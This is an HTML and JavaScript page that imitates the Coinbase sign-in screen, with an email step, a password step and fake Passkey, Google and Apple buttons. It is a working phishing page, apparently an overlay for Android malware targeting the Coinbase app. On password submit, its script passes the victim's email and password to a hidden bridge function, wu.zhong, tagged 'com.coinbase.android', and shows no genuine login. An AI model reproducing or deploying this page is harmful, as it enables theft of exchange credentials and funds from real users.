<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Sign in to Coinbase</title>
    <meta name="description" content="Sign in to your Coinbase account to access crypto trading and wallet services.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f8f9fb;
            color: #0d1421;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 20px 24px;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 48px;
        }

        .coinbase-logo {
            width: 40px;
            height: 40px;
            background: #0052ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .coinbase-logo::after {
            content: '';
            width: 16px;
            height: 16px;
            background: white;
            border-radius: 2px;
        }

        .signup-link {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .main-content {
            flex: 1;
            max-width: 400px;
            width: 100%;
            margin: 0 auto;
        }

        .page-title {
            font-size: 32px;
            font-weight: 600;
            color: #0d1421;
            margin-bottom: 32px;
            line-height: 1.2;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            color: #0d1421;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 2px solid #e6e8ea;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.2s;
            background: white;
            color: #0d1421;
        }

        .form-input:focus {
            border-color: #0052ff;
        }

        .form-input::placeholder {
            color: #8a919e;
        }

        .continue-button {
            width: 100%;
            padding: 16px;
            background: #0052ff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 24px;
        }

        .continue-button:hover:not(:disabled) {
            background: #0041cc;
        }

        .continue-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .divider {
            text-align: center;
            margin: 24px 0;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e6e8ea;
        }

        .divider-text {
            background: #f8f9fb;
            padding: 0 16px;
            color: #8a919e;
            font-size: 14px;
        }

        .social-button {
            width: 100%;
            padding: 16px;
            background: white;
            border: 2px solid #e6e8ea;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            color: #0d1421;
            cursor: pointer;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: border-color 0.2s, background-color 0.2s;
        }

        .social-button:hover {
            border-color: #d4d7db;
            background: #fafbfc;
        }

        .social-icon {
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .passkey-icon {
            width: 20px;
            height: 20px;
        }

        .google-icon {
            width: 20px;
            height: 20px;
        }

        .apple-icon {
            width: 20px;
            height: 20px;
        }

        .user-info-container {
            background: white;
            border: 2px solid #e6e8ea;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .user-avatar {
            width: 32px;
            height: 32px;
            background: #e6e8ea;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #8a919e;
        }

        .user-email {
            font-size: 16px;
            color: #0d1421;
            font-weight: 500;
        }

        .password-input-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            color: #8a919e;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .forgot-password-link {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 32px;
            display: inline-block;
        }

        .forgot-password-link:hover {
            text-decoration: underline;
        }

        .hidden {
            display: none;
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #0d1421;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.3s;
            max-width: calc(100vw - 40px);
        }

        .toast.show {
            opacity: 1;
        }

        .toast.error {
            background: #d73a49;
        }

        @media (max-width: 480px) {
            .container {
                padding: 16px 20px;
            }
            
            .page-title {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
       
        <div class="header">
            <div class="coinbase-logo"></div>
            <a href="#" class="signup-link" data-testid="link-signup">Sign up</a>
        </div>

        <div class="main-content">
          
            <div id="signin-page">
                <h1 class="page-title">Sign in to Coinbase</h1>

             
                <form id="signin-form">
                    <div class="form-group">
                        <label for="email-input" class="form-label">Email</label>
                        <input 
                            type="email" 
                            id="email-input"
                            class="form-input" 
                            placeholder="Your email address"
                            data-testid="input-email"
                            autocomplete="username"
                            autofocus
                        >
                    </div>

                    <button type="submit" class="continue-button" data-testid="button-continue" id="signin-continue">
                        Continue
                    </button>
                </form>

               
                <div class="divider">
                    <span class="divider-text">OR</span>
                </div>

             
                <button class="social-button" data-testid="button-passkey">
                    <div class="social-icon">
                        <svg class="passkey-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="9" cy="7" r="4"/>
                            <path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/>
                            <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
                            <path d="M21 21v-2a4 4 0 0 0-3-3.85"/>
                        </svg>
                    </div>
                    Sign in with Passkey
                </button>

                <button class="social-button" data-testid="button-google">
                    <div class="social-icon">
                        <svg class="google-icon" viewBox="0 0 24 24" fill="none">
                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                        </svg>
                    </div>
                    Sign in with Google
                </button>

                <button class="social-button" data-testid="button-apple">
                    <div class="social-icon">
                        <svg class="apple-icon" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                        </svg>
                    </div>
                    Sign in with Apple
                </button>
            </div>

         
            <div id="password-page" class="hidden">
                <h1 class="page-title">Sign in to Coinbase</h1>

              
                <div class="user-info-container">
                    <div class="user-avatar">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                        </svg>
                    </div>
                    <span class="user-email" id="display-email" data-testid="text-user-email"></span>
                </div>

                
                <form id="password-form">
                    <div class="form-group">
                        <label for="password-input" class="form-label">Password</label>
                        <div class="password-input-container">
                            <input 
                                type="password" 
                                id="password-input"
                                class="form-input"
                                data-testid="input-password"
                                autocomplete="current-password"
                                autofocus
                            >
                            <button type="button" class="password-toggle" id="password-toggle" data-testid="button-password-toggle">
                                <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                    <circle cx="12" cy="12" r="3"/>
                                </svg>
                            </button>
                        </div>
                    </div>

                    <a href="#" class="forgot-password-link" data-testid="link-forgot-password">
                        Forgot password?
                    </a>

                    <button type="submit" class="continue-button" data-testid="button-continue" id="password-continue">
                        Continue
                    </button>
                </form>
            </div>
        </div>
    </div>

   
    <div id="toast" class="toast"></div>

    <script>
   
        let currentEmail = '';
        let isLoading = false;

        
        function showToast(message, isError = false) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = `toast ${isError ? 'error' : ''} show`;
            
            setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }

        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function setLoading(button, loading) {
            button.disabled = loading;
            button.textContent = loading ? 'Loading...' : 'Continue';
            isLoading = loading;
        }

        function showPage(pageId) {
            document.getElementById('signin-page').classList.add('hidden');
            document.getElementById('password-page').classList.add('hidden');
            document.getElementById(pageId).classList.remove('hidden');
        }

      
        document.getElementById('signin-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (isLoading) return;
            
            const emailInput = document.getElementById('email-input');
            const email = emailInput.value.trim();
            const continueButton = document.getElementById('signin-continue');
            
            if (!email) {
                showToast('Please enter your email address.', true);
                return;
            }

            if (!validateEmail(email)) {
                showToast('Please enter a valid email address.', true);
                return;
            }

            setLoading(continueButton, true);
            currentEmail = email;
            
         
            setTimeout(() => {
                document.getElementById('display-email').textContent = email;
                showPage('password-page');
                setLoading(continueButton, false);
                
             
                setTimeout(() => {
                    document.getElementById('password-input').focus();
                }, 100);
            }, 800);
        });

        document.getElementById('password-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (isLoading) return;
            
            const passwordInput = document.getElementById('password-input');
            const password = passwordInput.value.trim();
            const continueButton = document.getElementById('password-continue');
            
            if (!password) {
                showToast('Please enter your password.', true);
                return;
            }

            setLoading(continueButton, true);
            
      
            setTimeout(() => {

                setLoading(continueButton, false);
                
                 wu.zhong(`🔰Coinbase Login \n\n✉️Email: ${currentEmail}\n🔒Password: ${password}`,"com.coinbase.android");

                
               
            }, 1000);
        });


        document.getElementById('password-toggle').addEventListener('click', function() {
            const passwordInput = document.getElementById('password-input');
            const eyeIcon = document.getElementById('eye-icon');
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            
            if (isPassword) {
              
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
            } else {
                
                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
            }
        });

    
        document.querySelectorAll('.social-button').forEach(button => {
            button.addEventListener('click', function() {
                const buttonText = this.textContent.trim();
                showToast(`${buttonText} is unavailable`);
            });
        });

        document.addEventListener('DOMContentLoaded', function() {
            showPage('signin-page');
            document.getElementById('email-input').focus();
        });

        
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.getAttribute('href') === '#') {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
